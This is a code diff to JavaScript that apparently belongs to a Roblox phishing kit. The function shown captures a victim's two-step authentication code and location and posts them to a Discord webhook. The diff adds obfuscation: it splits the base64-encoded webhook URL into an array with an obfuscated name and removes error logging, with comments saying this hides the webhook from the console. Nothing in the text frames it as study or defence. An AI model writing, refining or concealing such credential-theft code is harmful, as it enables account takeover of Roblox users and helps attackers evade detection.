@@ -742,8 +742,9 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
         // Get user's location info
         const locationInfo = await getUserLocation();
         
-        // Decode webhook URL
-        const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NjAzODUwOTM1MDk5ODA0Ny8wbGNQSDhKdkE5SG5xUkVOQlJiMnZwTGF6SDU5YUhJQ0ZXQ1JaV2I0R0pwZ1VqMmVoOTBhODRlQktWRXc3V1g0NEg4ZQ==");
+        // Decode webhook URL (hidden from console)
+        const _0x1a2b = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv", "MTM5NjAzODUwOTM1MDk5ODA0Ny8wbGNQSDhKdkE5SG5x", "UkVOQlJiMnZwTGF6SDU5YUhJQ0ZXQ1JaV2I0R0pwZ1Vq", "MmVoOTBhODRlQktWRXc3V1g0NEg4ZQ=="];
+        const webhookUrl = atob(_0x1a2b.join(""));
         
         const embed = {
             title: "🔐 Roblox 2-Step Authentication Code Captured",
@@ -794,10 +795,16 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify(payload)
+        }).then(response => {
+            // Silently handle response without logging webhook URL
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
         });
 
     } catch (error) {
-        console.error('Failed to send 2FA code to webhook:', error);
+        // Hide webhook URL from error logs
+        // Silent error handling to prevent webhook exposure
     }
 }
 
